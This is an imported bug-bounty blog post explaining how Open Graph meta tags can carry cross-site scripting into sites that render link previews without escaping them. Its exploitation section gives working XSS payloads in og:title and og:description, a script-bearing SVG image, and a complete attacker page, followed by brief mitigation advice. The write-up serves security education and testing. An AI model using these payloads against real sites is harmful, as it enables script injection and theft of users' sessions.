---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-20_a-tale-of-og-xss.md
original_filename: 2023-07-20_a-tale-of-og-xss.md
title: A Tale of OG XSS
category: documents
detected_topics:
- xss
- command-injection
- csrf
tags:
- imported
- documents
- xss
- command-injection
- csrf
language: en
raw_sha256: c151ca17c4ea79b5cfc9203a7e3d6bcbc9fc6c74629aeebb1969460c26fa48f7
text_sha256: d6ef7d38d68ce21b7d84976f1e680d436de0cff48c42ead2ac059b7e438f58ce
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# A Tale of OG XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-20_a-tale-of-og-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, csrf
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `c151ca17c4ea79b5cfc9203a7e3d6bcbc9fc6c74629aeebb1969460c26fa48f7`
- Text SHA256: `d6ef7d38d68ce21b7d84976f1e680d436de0cff48c42ead2ac059b7e438f58ce`


## Content

---
title: "A Tale of OG XSS"
url: "https://medium.com/@mullangisashank/a-tale-of-og-xss-89af3d4725dc"
authors: ["Mullangisashank (@manisashankm)"]
bugs: ["XSS", "Open Graph"]
publication_date: "2023-07-20"
added_date: "2023-07-24"
source: "pentester.land/writeups.json"
original_index: 908
scraped_via: "browseros"
---

# A Tale of OG XSS

A Tale of OG XSS
Mullangisashank
Follow
6 min read
·
Jul 21, 2023

46

3

Hello there InfoSec Community. 👋

Today allow me to take you on a short tale of “The OG XSS”. But first let’s start with a small intro about myself and then dive into the main topic.

I’m Mani Sashank. By day, I work as a Senior Security Analyst, but in my spare time, I pursue bug bounty hunting as a hobby. By the end of this article you’ll have a pretty good idea on what is OG XSS and how to hunt for these types of XSS’es.

Now that we’ve gotten the introductions handled, it’s time to jump into the meat of the article.

This article contains of 5 main parts:

What is meant by OG, and how is it used? (Theory)
Understanding OG with an example.
How can we exploit this?
POC’s
Mitigation
Part 1: What is OG, and how is it used?

This time let’s start the article with a question. What do you think the “OG” in the article title stands for? 🤔 Pause give it some thought and then let’s continue…

So the OG in the title stands for …

*** drum roll sound ***

Open Graph

Let’s ask ~google~ ChatGPT what does Open Graph mean.

Open Graph is a protocol used to enable webpages to become objects in social media networks. It allows developers to control how their web pages are presented when shared on social media platforms like Facebook, Twitter, LinkedIn, and others. The Open Graph protocol was first introduced by Facebook in 2010 to address the limitations of social media sharing.

When a webpage is shared on social media, the platform will typically display a preview, including a title, description, and image. Without Open Graph, social media platforms might struggle to fetch the correct information from a webpage, leading to a generic preview that might not accurately represent the content.

By implementing Open Graph meta tags within the webpage’s HTML, developers can specify the title, description, and image that should be displayed when the page is shared on social media. This gives content creators greater control over how their content is presented, leading to a more engaging and accurate preview for users on social media platforms.

For example, when you share a link on Facebook, the Open Graph tags help Facebook fetch the title, description, and thumbnail image to display in the post preview, creating a more visually appealing and informative link preview.

Some common Open Graph meta tags include:

<meta property="og:title" content="Your title here"> : Sets the title of the shared content.

<meta property="og:description" content="Your description here"> : Sets the description of the shared content.

<meta property="og:image" content="URL to your image here"> : Sets the thumbnail image of the shared content.

Open Graph is essential for social media marketing, as it ensures that shared links are presented in the best possible way, encouraging more click-throughs and engagement from users.

The above part explains the theory part of what is OG and how to use OG. Now let’s see how it works with the help of twitter.com.

Part 2: Understanding OG with an example

Below are two screenshots the first one showing how twitter tried to render/present the link of my previous medium article and the second screenshot showing the code responsible for this.

Press enter or click to view image in full size
Press enter or click to view image in full size

As you can see from above screenshots the “og:title” from the code is what was rendered on twitter as the title of the article, and it follows the same for “og:description”, “og:image” tags also. Additionally you can visit my previous article or any medium.com article and search for “og:” in the source code to find all the open graph related tags.

Get Mullangisashank’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So now since you have a bit of understanding on what is OG and why it is used, let’s get into how we can exploit this.

Part 3: How can we exploit this?

In many instances, URLs are rendered or presented by the websites without proper sanitization or encoding. This oversight leaves the door open for XSS attacks to slip through.

We can test for XSS vulnerabilities by injecting code into Open Graph metadata attributes, and observing whether the application blindly includes them on its website without sanitization.

To inject the code we can use the attributes of Open Graph like “og:title” or “og:description”. Here let me give you an example:

<meta property="og:title" content="<img src=x onerror=alert(document.domain)>" />
<meta property="og:description" content="<img src=x onerror=alert('document.domain')>" />

When a vulnerable application or website renders a link containing attacker-controlled Open Graph metadata, it blindly embeds the malicious XSS payloads into its own page. This indicates the application fails to sanitize external data before outputting it, making it prone to cross-site scripting attacks through poisoned Open Graph tags.

The Open Graph also supports “og:image” tag which specifies the link to a image. Here instead of a regular image we can give a link to some malicious SVG file which has our injected code, so the application or website will try to render this image and execute our injected code. Below is an example which shows the value of “og:image” tag and the SVG image code I use.

The Open Graph protocol also includes an “og:image” tag which specifies a link to an image. Attackers can exploit this by providing a URL to a malicious SVG file containing injected code rather than a real image. When a vulnerable application or website tries to render this attacker hosted image, it will execute the XSS attack code. Below is an example which shows the value of “og:image” tag and the SVG image code I use.

<meta property="og:image" content="/evil.svg" /> #edit the link in the content as per your requirement 

svg image code:

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
  alert(document.domain);
  </script>
</svg>

Now save the above XML in a file with an extension of “.svg” to create the file.

Part 4: POC’s

And the last part of the article the POC’s

To wrap up, below is a POC which was taken on a vulnerable website.

Press enter or click to view image in full size
Press enter or click to view image in full size

As demonstrated in the previous screenshots, applications and websites that embed Open Graph metadata without sanitizing or encoding the data are vulnerable to XSS attacks. The unvalidated inclusion of external OG attributes provides an open door for injection of malicious scripts into their webpages.

Code for the attacker controlled website:

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- <title><h1>vulnerable</h1></title> -->
  <title><img src=x onerror=alert("title")></title>
  <meta property="og:title" content="<img src=x onerror=alert(document.domain)>" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://google.com"/>
  <!-- <meta property="og:image" content="https://pmcvariety.files.wordpress.com/2018/01/vin-diesel-bloodshot.jpg?w=1000&h=563&crop=1" /> -->
  <meta property="og:image" content="/evil.svg" />
  <meta property="og:description" content="<img src=x onerror=alert('vulnerable')>" />
</head>
<body>
</body>
</html>
Part 5: Mitigation

This vulnerability can be mitigated by not blindly trusting external Open Graph metadata and properly sanitizing, encoding those external Open Graph metadata values before output. Validating input and escaping outputs prevents malicious scripts from being embedded into websites.

So that’s it for this article B&G’s. Feedback to the articles is very much appreciated. You can give a clap or leave a comment here. Hey you can even send me a DM on twitter about the articles feedback or topics on which you want me to explore further. 😉

Social Media Links:

Instagram: https://www.instagram.com/mani.sashank/

Twitter: https://twitter.com/manisashankm

LinkedIn: https://www.linkedin.com/in/manisashank/

In the next blog let’s discuss about a private program where I was able to chain xss + bypassing the double submit cookie csrf protection = Account takeover.

Wishing you the very best in your bug bounty hunting endeavors. 🤞

See you in the next article. Till then. ✌
